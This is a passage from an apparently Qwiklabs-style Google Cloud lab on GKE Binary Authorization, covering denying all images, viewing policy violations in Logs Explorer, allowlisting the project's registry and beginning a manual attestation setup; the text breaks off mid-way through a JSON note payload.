23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp;  READY &nbsp; &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nginx &nbsp; 1/1 &nbsp; &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  1m</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>If this fails recheck your cluster-specific region and name and try again.</span></p><ol start='' ><li><p><span>Now, delete this pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl delete pod nginx</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Next, prove that the Binary Authorization policy can block undesired images from running in the cluster.</span></p></li></ol><p><span>On the Binary Authorization page, click </span><strong><span>Edit Policy</span></strong><span>,</span></p><ol start='' ><li><p><span>Click on the three vertical dots to the right of your GKE Cluster specific rule, and click </span><strong><span>edit</span></strong><span>.</span></p></li><li><p><span>Then, select </span><code>Disallow all images</code><span>, click </span><strong><span>Submit</span></strong><span>.</span></p></li></ol><p><span>Your policy should look similar to the following:</span></p><p><img src="images\15FLpP5Fg122n4o0jNBmPYiynTMKl0XUYyrIlDeVflQ%3D" referrerpolicy="no-referrer" alt="Edit GKE cluster-specific rule for us-central1-a.mycluster-1 dialog box with Disallow all images option selected"></p><ol start='' ><li><p><span>Finally, click </span><strong><span>Save Policy</span></strong><span> to apply those changes.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Wait at least 30 seconds before proceeding to allow the policy to take effect.</span></p><h3 id='test-completed-task-3'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully updated Binary Authorization Policy to Disallow all images rule at cluster level, you will see an assessment score.</span></p><p><span>Update cluster specific policy to Disallow all images</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><ol start='' ><li><p><span>Now, run the same command as before to create the static </span><code>nginx</code><span> pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt; EOF | kubectl create -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: "gcr.io/${PROJECT_ID}/nginx:latest"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ports:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - containerPort: 80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This time, though, you should receive a message from the API server indicating that the policy prevented this pod from being successfully run:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (VIOLATES_POLICY): error when creating "STDIN": admission webhook "imagepolicywebhook.image-policy.k8s.io" denied the request: Image gcr.io/qwiklabs-gcp-00-ce851250686b/nginx:latest denied by Binary Authorization cluster admission rule for europe-west4-c.my-cluster-1. Denied by always_deny admission rule</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>To be able to see when any and all images are blocked by the Binary Authorization Policy, navigate to the GKE Audit Logs in Stackdriver and filter on those error messages related to this activity.</span></p><ol start='' ><li><p><span>In the Google Cloud console, navigate to the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Logging</span></strong><span> &gt; </span><strong><span>Logs Explorer</span></strong><span>.</span></p></li><li><p><span>Populate the </span><strong><span>Query builder</span></strong><span> box with:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type="k8s_cluster" protoPayload.response.reason="VIOLATES_POLICY"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><img src="images\CuB3tuWp04fgeKzw0axcGm3yu4x0X29NGzmMlCO0IRI%3D" referrerpolicy="no-referrer" alt="Query builder box with populated code"></p><ol start='' ><li><p><span>Click </span><strong><span>Run Query</span></strong><span>.</span></p></li><li><p><span>You should see errors corresponding to the blocking of the </span><code>nginx</code><span> pod from running.</span></p></li></ol><h3 id='test-completed-task-4'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully verified cluster admission rule, you will see an assessment score.</span></p><p><span>Create a Nginx pod to verify cluster admission rule is applied for disallow all images (denies to create)</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><h2 id='task-8-denying-images-except-from-allowlisted-container-registries'><span>Task 8. Denying images except from allowlisted container registries</span></h2><ol start='' ><li><p><span>Let&#39;s say that you actually want to allow </span><em><span>just</span></em><span> that nginx container to run. The quickest step to enable this is to </span><em><span>allowlist</span></em><span> the registry that it comes from.</span></p></li><li><p><span>You will use the output of the following command as your image path:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "gcr.io/${PROJECT_ID}/nginx*"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Copy the image path output to your buffer.</span></p></li><li><p><span>Navigate to the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Security</span></strong><span> &gt; </span><strong><span>Binary Authorization</span></strong><span>.</span></p></li><li><p><span>Edit the Binary Authorization Policy, under </span><strong><span>Custom exemption rules</span></strong><span> display the image paths, then click </span><strong><span>Add an Image Pattern</span></strong><span>.</span></p></li><li><p><span>Paste in the image path you copied earlier. The image below shows an example path.</span></p></li></ol><p><img src="images\oVBBEQuWzsLCxLZKG8BU0V0ttpzpeVP%2FM9BC%2FZZ0YPA%3D" referrerpolicy="no-referrer" alt="Binary Authorization screen with image path populated in the new image pattern field"></p><ol start='' ><li><p><span>Click </span><strong><span>Save Policy</span></strong><span>, then run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt; EOF | kubectl create -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: "gcr.io/${PROJECT_ID}/nginx:latest"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ports:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - containerPort: 80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should now be able to launch this pod and prove that registry allowlisting is working correctly.</span></p><ol start='' ><li><p><span>Run the following to clean up and prepare for the next steps:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl delete pod nginx</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='test-completed-task-5'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully updated Binary Authorization policy to allowlist the container registry, you will see an assessment score.</span></p><p><span>Update BA policy to denying images except from allowlisted container registries (your project container registry)</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><h2 id='task-9-enforcing-attestations'><span>Task 9. Enforcing attestations</span></h2><p><span>Allowlisting container image registries is a great first step in preventing undesired container images from being run inside a cluster, but there is more you can do to ensure the container was built correctly.</span></p><p><span>You want to cryptographically verify that a given container image was approved for deployment. This is done by an &quot;attestation authority&quot; which states or </span><em><span>attests</span></em><span> to the fact that a certain step was completed. The attestation authority does this by using a PGP key to </span><em><span>sign</span></em><span> a snippet of metadata describing the SHA256 hash of a container image and submitting it to a central metadata repository--the Container Analysis API.</span></p><p><span>Later, when the Admission Controller goes to validate if a container image is allowed to run by consulting a Binary Authorization policy that requires attestations to be present on an image, it will check to see if the Container Analysis API holds the signed snippet(s) of metadata saying which steps were completed. With that information, the Admission Controller will know whether to allow or deny that pod from running.</span></p><p><span>Next, perform a manual attestation of a container image. You will take on the role of a human attestation authority and will perform all the steps to sign a container image, create a policy to require that attestation to be present on images running inside your cluster, and then successfully run that image in a pod.</span></p><h3 id='setting-up-the-necessary-variables'><span>Setting up the necessary variables</span></h3><ol start='' ><li><p><span>Attestor name/email details:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ATTESTOR="manually-verified" # No spaces allowed</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ATTESTOR_NAME="Manual Attestor"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ATTESTOR_EMAIL="$(gcloud config get-value core/account)" # This uses your current user/email</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Container Analysis Note ID/description of your attestation authority:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NOTE_ID="Human-Attestor-Note" # No spaces</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NOTE_DESC="Human Attestation Note Demo"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Names for files to create payloads/requests:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NOTE_PAYLOAD_PATH="note_payload.json"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IAM_REQUEST_JSON="iam_request.json"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='creating-an-attestation-note'><span>Creating an attestation note</span></h3><p><span>The first step is to register the attestation authority as a </span><a href='https://cloud.google.com/binary-authorization/docs/key-concepts#analysis_notes'><span>Container Analysis note</span></a><span> with the Container Analysis API. To do this, you&#39;ll create an </span><code>ATTESTATION</code><span> note and submit it to the API.</span></p><ol start='' ><li><p><span>Create the </span><code>ATTESTATION</code><span> note payload:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &gt; ${NOTE_PAYLOAD_PATH} &lt;&lt; EOF</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  "name": "projects/${PROJECT_ID}/notes/${NOTE_ID}",</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  "attestation_authority": {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "hint": {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  "human_readable_name": "${NOTE_DESC}"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 